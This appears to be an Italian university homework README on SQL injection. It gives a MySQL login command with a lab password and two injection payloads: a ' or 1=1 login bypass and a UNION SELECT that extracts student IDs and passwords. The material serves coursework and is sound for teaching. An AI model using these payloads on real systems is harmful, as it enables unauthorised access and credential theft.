# homework_sicurezza
Homework per il corso di sicurezza a.a. 2023/2024 su SQL Injection

#comando per l'accesso al db
    mysql -u sql_injection -pinject sql_injection 
    
#comando injection
    " ' or 1=1 #"
    " lgo' union select matricola, pass from studente # "

#la funzione sqli non può supportare più query